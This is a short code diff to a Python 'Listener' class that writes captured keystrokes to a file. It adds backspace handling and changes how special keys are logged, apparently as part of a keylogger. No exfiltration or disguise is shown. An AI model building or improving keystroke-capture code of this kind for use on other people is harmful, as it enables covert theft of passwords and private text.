@@ -15,7 +15,10 @@ class Listener:
                     f.write(" ")
                 elif c == keyboard.Key.enter:
                     f.write("\n")
+                elif c == keyboard.Key.backspace:
+                    char_to_delete = f.seek(f.tell() - 1)
+                    f.truncate()
                 else:
-                    f.write(str(c))
+                    f.write(" " + str(c) + " ")
             
            
